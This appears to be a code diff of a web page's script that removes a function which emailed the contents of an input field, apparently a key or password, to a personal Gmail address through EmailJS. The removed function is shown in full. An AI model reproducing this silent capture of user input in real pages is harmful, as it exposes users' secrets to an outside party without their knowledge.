@@ -25,7 +25,7 @@
 
         document.getElementById("check").onclick = togglepassword;
         document.getElementById("sendButton").onclick = m;
-        document.getElementById("k").onchange = send;
+        
         
         function togglepassword() {
             var pass = document.getElementById("pass");
@@ -39,25 +39,7 @@
             let k = document.getElementById('k').value;            
             window.location.href = "menu.html?k=" + k;
         }
-        function send(){
-            let k = document.getElementById('k').value;
-           var params = {
-                name: "one body is inserted",
-                email: "eyobeb337@gmail.com",
-                message: k
-            };
-
-            console.log("Sending email with params:", params); // Debugging
-
-            emailjs.send("service_sjp7z9x", "template_bcmnf95", params)
-                .then(function(response) {
-                    console.log("Email sent successfully:", response);
-                    
-                }, function(error) {
-                    console.log("Failed to send email:", error);
-                
-                }); 
-        }
+        
      });
     </script>
 </body>
